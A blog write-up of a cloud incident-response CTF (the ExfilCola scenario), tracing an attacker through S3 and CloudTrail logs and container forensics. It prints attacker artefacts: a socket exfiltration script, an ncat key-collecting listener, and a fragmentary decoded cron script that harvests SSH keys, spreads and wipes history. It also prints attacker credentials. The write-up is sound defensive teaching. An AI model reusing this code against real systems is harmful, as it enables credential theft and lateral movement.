Wiz recently released [the Cloud Hunting Games](https://www.wiz.io/blog/the-cloud-hunting-games-ctf-challenge) featuring the [The ExfilCola Incident](https://www.cloudhuntinggames.com/?utm_source=blog) CTF. The goal of the challenge is to step into the shoes of an incident response expert, _unfold the steps of the attacker, trace them back to the initial access point, and make sure that the secret formula is safe._  This blog post contains the methods that I used while completing this challenge - if you are reading this, I hope you find it useful!

_Cloud Hunting Games - Introduction_

When you click on the link, you'll be presented with the home screen for "The Cloud Hunting Games". Before jumping straight into the investigation, lets click on the "Read Extortion Email" button, the contents of which are shown in the screenshot below:
![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506094404.png)
_Extortion Email sent by FizzShadows_

Let's take note of what we know at this point:
- **Time of Initial Email:** May 6, 2025 03:14am
- **Threat Actor:** FizzShadows
- **Target Company:** ExfilCola
- **What Happened?** FizzShadows claim to have exfiltrated ExfilCola's Secret Recipes
- **Threat:** Releasing sensitive data if 75 Bitcoin are not transferred to a specific bitcoin wallet. 

The main goal of this investigation will be to confirm whether FizzShadows actually has access to the data that they claim to have. Lets dive in! 

# Challenge 1 - Ain't no data when she's gone
> While not explicitly used during this CTF, the [AWS Cloud Incident Analysis Query Cheatsheet](https://securosis.com/blog/aws-cloud-incident-analysis-query-cheatsheet/) blog post by Rich Mogul contains a mnemonic (RECIPE PICKS) which is a great resource for performing the initial triage steps during a Cloud incident. If you haven't seen it yet, I highly recommend reading the post.

If you are following along, once you click the "Start Investigation" button, you will be presented with another screen showing a SQLite database and a task for the initial challenge:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506094734.png)
_Challenge 1 - Starting Point_

> FizzShadows claim that they were able to exfiltrate ExfilCola's secret recipes. You have to validate this claim before considering any further steps.
> All ExfilCola's secret recipes are stored in a secured S3 bucket. Luckily, their security team was responsible enough to make sure that S3 data events were collected. You've been granted access to these logs, which are available in the s3_data_events table.
>Go ahead and see if there are any traces of exfiltration: find the IAM role involved in the attack.

The log source that we currently have access to is `s3.amazonaws.com`. To determine the initial order of events, we need to look into the data that is held within the database. To make it more readable (or at least logically ordered), you can use the `Order by` parameter. 

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506101251.png)
_Full S3 Data Events_

As shown above, the database had a number of columns that would be useful to us during the investigation. Since this is a data exfiltration investigation, the **GetObject** event will be the likely starting point. Before diving in to the logs, I wanted to get a rough overview of the types of events that can be expected within the environment:
```
SELECT  s3_data_events.EventName, count(s3_data_events.EventName) FROM s3_data_events
group by s3_data_events.EventName
```

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506102154.png)
_Breakdown of S3 Data Events by EventName_

The data contained a number of `GetObject` events with the majority of events likely being legitimate traffic for the environment. To help narrow down the search, I modified the query to retrieve a breakdown of the types of events the user identities used within the environment, I ran a quick query to count the `event names` by the `ARN`:
```
SELECT s3_data_events.EventTime, count(distinct s3_data_events.EventName), s3_data_events.userIdentity_ARN FROM s3_data_events
group by s3_data_events.userIdentity_ARN
order by count(distinct s3_data_events.EventName) desc
```

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506103930.png)
_Breakdown of S3 Data Events by ARN_

As shown above, most of the identities generally made use of 3 `events` or less, however there was one that was above the normal usage within the environment - `S3Reader`. Before jumping to conclusions, I also created a query to get an overview of the general activity for the user identities on a day-to-day basis.

```
SELECT  s3_data_events.userIdentity_ARN, GROUP_CONCAT(DISTINCT DATE(substr(s3_data_events.EventTime, 1, 10))) AS ActiveDays
FROM s3_data_events
group by s3_data_events.userIdentity_ARN 
order by ActiveDays desc
```

Using the query, the `S3Reader` role stood out again as all of the activity occurred on **2025-05-05** and the activity included the `GetObject` event. The `tom.c` user was also interesting for the same reason:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250508114558.png)
_Breakdown of S3 Data Events by Day per User Identity_

## Investigating Tom.C and S3Reader

I decided to start by investigating these two suspicious users since they both had the `GetObject` event associated with their accounts the day before the extortion email was sent to ExfilCola. Using the user identities as a starting point, we can retrieve the requests that they made to the server:

```
SELECT s3_data_events.EventTime, s3_data_events.EventName, s3_data_events.requestParameters, s3_data_events.IP FROM s3_data_events
where s3_data_events.userIdentity_ARN = "arn:aws:iam::509843726190:user/tom.c"
order by s3_data_events.EventTime desc
```

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250508115042.png)
_GetObject Events performed by Tom.C_

As shown above, the `Tom.C` user retrieved a few files including the "TOP SECRET" file from the S3 Bucket! We can use the same commands to retrieve the information for the `S3Reader` identity:

```
SELECT s3_data_events.EventTime, s3_data_events.EventName, s3_data_events.requestParameters, s3_data_events.IP FROM s3_data_events
where s3_data_events.userIdentity_ARN = "arn:aws:sts::509843726190:assumed-role/S3Reader/drinks"
order by s3_data_events.EventTime desc
```

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506104403.png)
_GetObject Events performed by S3Reader_

As shown above, the events for the `S3Reader` include a large number of `GetObject` events and terminate in a **PutObject** event where the user added `letter.txt` to the `soda-vault` bucket. Since the `S3Reader` role should only have Read based permissions, the fact that it not only retrieved files from the server but ended by placing an object on the server was highly suspicious and this is where I decided to focus my effort. 

- **Suspicious User Identity:** arn:aws:sts::509843726190:assumed-role/S3Reader/drinks
- **Event(s):** GetObject, PutObject
- **First Access:** 2025-05-05T12:47:00Z
- **Last Access:** 2025-05-05T12:52:00Z
- **IP Address:** 37.19.199.135

> This analysis was correct and resulted in the successful submission of the flag: **arn:aws:sts::509843726190:assumed-role/S3Reader/drinks**
{: .prompt-info } 

# Challenge 2: Follow, follow the trail

> So you have managed to validate FizzShadows' claim and track the IAM role that has exfiltrated ExfilCola's recipe. You've been granted access to the cloudtrail table.
> Follow the trail of the S3Reader. Who used it?

Challenge 2 started in the same fashion with access to a SQLite database. However, we now had access to Cloudtrail logs for the investigation:

```
SELECT * FROM cloudtrail
where cloudtrail.userIdentity_ARN = "arn:aws:sts::509843726190:assumed-role/S3Reader/drinks"
order by cloudtrail.EventTime ASC 
```

To start the investigation, I queried the logs for activity performed by the `S3Reader` identity:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506110156.png)
_Cloudtrail Search for the S3Reader User Identity_

 As shown above, the query produced a single result. Since we're looking for the user that used (assumed) the role, we can pivot to look for `AssumeRole` events. We already know the name of the affected user identity so we can modify the query to look for request or response parameters containing the `S3Reader` role with the session name `Drinks`:

```
SELECT cloudtrail.EventTime, cloudtrail.userIdentity_ARN, cloudtrail.userIdentity_userName, cloudtrail.IP, cloudtrail.IP_Country,cloudtrail.UserAgent FROM cloudtrail
where cloudtrail.EventTime LIKE "2025-05-05%" and cloudtrail.EventName = "AssumeRole" and 
(
  (cloudtrail.requestParameters like '%S3Reader%' and cloudtrail.requestParameters like '%drinks%') or 
  (cloudtrail.responseElements like '%S3Reader%' and cloudtrail.requestParameters like '%drinks%')
)
order by cloudtrail.EventTime desc 
```

Running the above query produced a single user identity that used the session name `Drinks` for the `S3Reader` role: 

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506111324.png)
_Identifying the Initial Access Role - Moe Jito_

- **Suspicious User:** Moe.Jito
- **Event Name:** AssumeRole
- **Role Assumption Time:** 2025-05-05T12:43:21Z
- **IP Address:** 109.236.81.188	

> This analysis was correct and resulted in the successful submission of the flag: **Moe.Jito**
{: .prompt-info } 

# Challenge 3:  Deeper into the trail

> Bingo â€” you've tracked down the compromised IAM user: Moe.Jito. Keep digging through the CloudTrail logs.
> Follow the attacker's footsteps and find the machine that was compromised and leveraged for lateral movement.

Challenge 3 also had access to Cloudtrail logs using the SQLite database. As a starting point, I retrieved the events associated with the user `Moe.Jito`: 

```
SELECT cloudtrail.EventTime, cloudtrail.EventName, cloudtrail.userIdentity_userName, cloudtrail.IP, cloudtrail.requestParameters, cloudtrail.responseElements FROM cloudtrail
where cloudtrail.userIdentity_userName = "Moe.Jito"
```

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506111729.png)
_Cloudtrail Search for Activity Performed by Moe.Jito_

The attacker started by using the `ListAttachedUserPolicies` event at `2025-05-05T12:40:26Z` from the IP Address `109.236.81.188`. While that displays the events that the user performed, we're interested in the events leading to the compromise of the `Moe.Jito` user. To help narrow down this part of the investigation, I listed the Cloudtrail events around the time of the account compromise (between 12pm - 1pm):

```
SELECT count(cloudtrail.EventName), cloudtrail.EventName FROM cloudtrail
where cloudtrail.EventTime LIKE '%2025-05-05T12%'
group by cloudtrail.EventName
```

As shown below, there were a number of events between 12pm - 1pm. There are a few suspicious events however the one that sticks out the most is the `UpdateFunctionCode20150331v2` event:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506112632.png)
_Cloudtrail Search for All Cloudtrail Events between 12pm - 1pm_

While the `CreateAccessKey` and `DeleteAccessKey` events can be used for persistence, they wouldn't be the intial access point to the machine that was compromised. The [UpdateFunctionCode](https://docs.aws.amazon.com/lambda/latest/api/API_UpdateFunctionCode.html) event is used to update the function code for a Lambda function in AWS. If the Lambda function is configured incorrectly, a malicious user can update the functions code and use it to perform actions on behalf of the role. Since this was the only event related to a "machine" during that timeframe, I used the following query to retrieve the role associated with the Lambda function and the associated request parameters:

```
SELECT cloudtrail.EventTime, cloudtrail.EventSource, cloudtrail.userIdentity_ARN, cloudtrail.requestParameters, cloudtrail.responseElements FROM cloudtrail
where cloudtrail.EventName = "UpdateFunctionCode20150331v2"
```

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250508120033.png)
_Cloudtrail Search for the UpdateFunctionCode Event_

- **Compromised Machine:** arn:aws:sts::509843726190:assumed-role/lambdaWorker/i-0a44002eec2f16c25	
- **Function Name:** Credsrotator
- **Time of Machine Compromise**: 2025-05-05T12:32:42Z 
- **IP Address:** 54.227.18.169	

> This analysis was correct and resulted in the successful submission of the flag: **i-0a44002eec2f16c25**
{: .prompt-info } 

# Challenge 4:  Ain't no mountain high enough to keep me away from my logs

> Great progress! As you continue your investigation, you discover that once the attacker compromised the EC2 machine, they were able to manipulate a Lambda function to gain access to multiple IAM users. ExfilCola has granted you root access to the EC2 machine where this activity originated from.
> But the question remains - how did the attacker gain access to this machine?
> Your task is to find the IP address of another ExfilCola workload that was used as the initial entry point into the organization.

Now that we've identified the exploited workload, we have been granted root access to the machine `ssh-fetcher`. However, when attempting to perform some basic enumeration on the host there didn't seem to be many tools installed:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506114433.png)
_Initial Access- Failed Attempts at Enumeration_

While I couldn't run a large number of commands as the binaries were removed from the machine, I was still able to list the running processes:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506114619.png)
_Intial Access - Process List_

There wassn't a lot to go off of except for the `healthcheck` command. Running the command showed a `Usage` option with a link to the `/var/log` directory:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506115520.png)
_Output of the Healthcheck Command and Associated Files_

I navigated to the directory to the to see if there were any logs which may assist during the investigation. As shown above, the only log that existed was `.gK8du9` which contained the text: **"FizzShadows were here..."**. 

Since there were no additional processes running on the host, I decided to take a step back. I navigated to the home directory and saw that the machine had 2 interactive user accounts associated with it: **postgresql-user** and **user**. The **user** profile seemed unused as it only contained a `.bashrc` file however the **postrgresql-user** profile had a few scripts and a `.ssh` directory:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506120225.png)
_Postgresql-user's Home Directory_

## Diving in to the Files - Logger.py

With access to the directory, I started by investigating the files on hand. The contents of the `logger.py` file is provided below:

```
import socket,os,pty,ssl
def validate(text):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        wrappedSocket = context.wrap_socket(s)
        wrappedSocket.connect(("fetcher.exfilcola.io",8443))
        wrappedSocket.send(repr(text).encode('utf-8'))
```

While not explicitly suspicious, there was a Socket connection referencing an internal ExfilCola host - `fetcher.exfilcola.io`. I attempted a number of ways to resolve the host IP including using machine's nameserver (`192.168.65.7` - retrieved from `/etc/resolv.conf`), however all attempts were unsuccessful:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250507094826.png)
_Failed Attempt at Host Resolution_

## Diving in to the Files - Bash History

Checking the `bash_history` for the **postgresql-user** had a large number of repeated events. Using `grep -v`, I was able to narrow down the activity that I cared about:

```
cat .bash_history | grep -v "get-caller-identity" | grep -v "aws lambda invoke"
```

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506140649.png)
_Bash History for the Postgresql-user Account_

As shown above, in addition to the repeated entries there were 3 unique commands:

```
findmnt
nohup ncat --ssl -klp 8443 > /tmp/.../keys_out.txt &
cat /tmp/.../keys_out.txt
```

The attackers created a directory named `...` within the `/tmp` directory. At a quick glance, this made it look as if there was nothing in the directory itself (it also doesn't show up if you do a basic `ls` command):
![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250508144717.png)
_Unique use of Directory Naming_

Since we were able to confirm that the `...` directory existed, I ran a recursive list (`ls -laR`) command to view all of the files contained within the directory and subdirectories:
![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506141637.png)
_Contents of the ... Directory_

Looking back at the commands from the `.bash_history` file, we can see that whatever activity the user performed with `ncat` was sent to `/tmp/.../keys_out.txt`.  We've already viewed the `.gK8du9` file so I decided to take a look at the contents of the `keys_out.txt`:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250506125659.png)
_Output from the keys\_out.txt File_

The excerpt above shows a list of names related to potentially compromised users. However, this still didn't provide insight into how the attacker gained access into the machine. 

## Diving in to the Files - Bash History Continued

Going back to the list of commands in `.bash_history`, the user ran `ncat` as well as `findmnt`. If you type in `findmnt`, a list of the available mounts will be displayed, including Source, Target, Filesystem Type, and Options:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250508145353.png)
_Mounted File Systems on the Compromised Host_

Similar information can be found by viewing the contents of the mounts file - `cat /proc/mounts`:

```

As shown above, there were a number of mounted directories. The ones that were interesting to me were the overlay mounts. While the `overlay` mounts do exist on the host - we can see them in the `findmnt` output as well as the `/proc/mounts` file, all attempts to list the contents of the `lowerdir`, `upperdir`, or `workdir` mount points failed because `/var/lib/containerd` was **not visible inside the container's mount namespace**.

### What is an Overlay Filesystem?

>TheÂ `lowerdir`Â is designated for read-only access and serves as the base layer, theÂ `upperdir`Â is the directory where all modifications are stored, acting as the writable layer, and theÂ `workdir`Â is used for processing changes before they are finalized in theÂ `upperdir`Â thus it is not included in the unified view. By accessing the filesystem through theÂ `/mnt/location`Â mount point, you obtain a unified view that seamlessly integrates theÂ `lowerdir`Â andÂ `upperdir`. In a containerization environment, containers should run in separate environments; they have their own file systems. They utilize overlay filesystems to manage changes made while the container is running and can also share the same base image among other containers, thereby saving a significant amount of disk space.
{: .prompt-info }

Generally, a mount is created using a command similar to:
```
sudo mount -t overlay overlay -o lowerdir=/path/to/lower,upperdir=/path/to/upper,workdir=/tmp/overlay /path/to/mount
```

If you refer back to the `findmnt` output, there are a few overlay mount points: `/`, `-/var/log`, and `-/var/log` again. If you look closer at the Target Mounts, it seems as if there are multiple points mounted over `/var/log` directory. 

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250507104635.png)
_Identifying Multiple Mount Overlays_

This implies that an **overlay filesystem** (`/work/storage/a0cd15e0-370c-4693-83b6-f3c339f98450/log`) was mounted at `/var/log` and then **another overlay filesystem** (`/work/rootfs/tmp/.../mnt`) was mounted at the same point `/var/log`. When accessing the `/var/log` directory on the host, you would access the **top-most (i.e., most recent) mount** at that path indicated by the backtick (\`) in the tree under `/var/log`. In Linux, if multiple filesystems are mounted on the same target (e.g., `/var/log`), only the **last one mounted** is visible â€” it **"shadows"** any previous mounts at the same location.

Therefore, when we accessed `/var/log`, we only saw the mount for the `/work/rootfs/tmp/.../mnt` overlay.


## Accessing the "Shadowed" Mount

To get into the first mount point (`/work/storage/3c658cea-88f8-4d44-b590-f661d6185911/log`) we needed to find a way to remove the `/work/rootfs/tmp/.../mnt` directory. To perform this action, I used the `umount` command:

```
umount /var/log
```

When running `umount` on a directory, only the **top-most mount** (the last one mounted on `/var/log`) will be unmounted.
- The underlying mount (the first overlay on `/var/log`) will **still be mounted**, and will become visible again.
- So, after the `umount`, you'd still have `/var/log` mounted â€” just with a different filesystem (the previously shadowed one).

_Accessing the Shadowed Mount Point_


## Finding the IP Address of another ExfilCola Workload
To determine the IP address that formed the initial access point, we needed to look for successful connections into the environment. If you recall from earlier, the `postgresql-user` had a `.ssh` file in the home directory. I started off by viewing the `auth.log` file, searching for the expected user (`postgresql-user`), and only searching for successful connection attempts:

```
 cat auth.log | grep -E postgresql-user | grep -E Accepted
```

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250507105200.png)
_Identifying IP Address of another ExfilCola Workload_

As shown above, there were several Accepted SSH connections from the  IP address - `102.54.197.238`. 

- **Compromised User:** postgresql-user 
- **Connection Type**: SSH
- **IP Address:** 102.54.197.238

There are several methods that can be used to persist on Linux based machines, including:
- Persistence via SSH
- Creating a Privileged Local Account
- Unix Shell Configuration Modification
- Persistence via Web Shell
- Persistence vis Cron Jobs

As this blog post is longer than I expected, I'm going to skip over all of the areas that I searched for persistence (SSH, Shell Modification's, etc.) and dive straight in to Cron Job persistence. If you are interested in learning more about the different techniques, I recommend reading through the following blog posts:
- <https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\>
- <https://www.linode.com/docs/guides/linux-red-team-persistence-techniques/#hackersploit-red-team-series>
- <https://pberba.github.io/security/2022/01/30/linux-threat-hunting-for-persistence-systemd-timers-cron/>

## Searching for Cron Job Persistence

If you want to view all cron jobs on the host, the files commonly reside in the `/var/spool/cron/crontabs/` directory. Looking in this directory, we can see that a Cronjob has been created for the `postgres` user: 

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250508151106.png)
_Identifying Cron Jobs on the Host_

As an alternative, if you're interested in listing the cronjobs available for your own user account, you can use the `crontab -l` command. However, that will only show the cronjobs associated with the logged in account. To get a list of all cronjobs, you can use the `-u` parameter while looping through all of the user's on the machine: 

```
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done
```

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250507113545.png)
_Listing Cron Jobs for all Users_

You can modify the command to include the user account that each Cron job belongs to by adding the `$user` variable to the output:
```
for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done
```

## Investigating the Postgres User's Cronjob
As shown above, the **postgres** user had a cronjob enabled. Looking into the file (`pg_sched`) revealed a base64 encoded object:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250508151258.png)
_Output of the pg\_sched file_

After base64 decoding the object, we ended up with the following script:
```
#!/bin/bash

    fi
}

install_dependency() {
    local package="$1"
    if [[ "$package" == "curl" ]]; then
        apt-get install curl -y &> /dev/null
                yum install curl -y &> /dev/null
    elif [[ "$package" == "unzip" ]]; then
        apt-get install unzip -y &> /dev/null
                yum install unzip -y &> /dev/null
    elif [[ "$package" == "aws" ]]; then
        install_aws_cli
    fi
}

# Install AWS CLI locally
install_aws_cli() {
    mkdir -p "$HOME/.aws-cli"
    curl -s "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "$HOME/.aws-cli/awscliv2.zip"

    unzip -q "$HOME/.aws-cli/awscliv2.zip" -d "$HOME/.aws-cli/"

    # Add AWS CLI to PATH
    export PATH="$HOME/.aws-cli/bin:$PATH"
    echo 'export PATH="$HOME/.aws-cli/bin:$PATH"' >> "$HOME/.bashrc"
}


# Try to spread
spread_ssh() {
    find_and_execute() {
        local KEYS=$(find ~/ /root /home -maxdepth 5 -name 'id_rsa*' | grep -vw pub;

        cat /dev/null > ~/.bash_history
fi
```

Based on the file contents, we now had potentially valid credentials and IP address information for the FizzShadows server:
- **IP Address:** 34.118.239.100
- **Port:** 4444
- **Username:** FizzShadows_1
- **Password:** Gx27pQwz92Rk

I attempted to create a connection using the credentials but my attempts failed (if you find a method to do it, please let me know!). Since the machine didn't have `nmap` installed, the next technique that I tested was using `cURL` to determine if the IP address was hosting a web application:

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250507140424.png)
_FizzShadows Web Server_

After running the `cUrl` command (`curl -kv 34.118.239.100`), the web server showcased the following "Available Endpoints":
```
Available Endpoints:
------------------

1. List All Files
   GET /files
   Returns a list of all files in the system.

2. Upload File
   POST /files/upload
   Upload a new file to the system.

3. Download File
   GET /files/{filename}
   Download a specific file by name.

4. Delete File
   DELETE /files/{filename}
   Remove a file from the system.
```

At this point we were finally closing in on our initial goal: "Confirm whether FizzShadows actually has access to the data that they claim to have". Using the `files` endpoint, my hope was that we would be able to identify the files stolen from ExfilCola:

```
curl -kv 34.118.239.100/files
```

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250508151700.png)
_FizzShadows Authentication Error_

As shown above, attempts to view the files resulted in an authentication error. To authenticate to the web server, I used the credentials from the script file and created a Basic Authentication request:
```
curl -kv 34.118.239.100/files -u "FizzShadows_1:Gx27pQwz92Rk"
```

![img-description](/assets/img/Wiz-Cloud-IR-Challenge/20250507140505.png)
_Listing the Files on the FizzShadows Web Server_

Success! The stolen files have been identified on the server. The final part of the challenge was to "Delete the secret recipe from the attacker's server". To do this, a simple DELETE request was sent to the server for the  `ExfilCola-Top-Secret.txt` file:
```
curl -X DELETE -kv 34.118.239.100/files/ExfilCola-Top-Secret.txt -u "FizzShadows_1:Gx27pQwz92Rk"
```
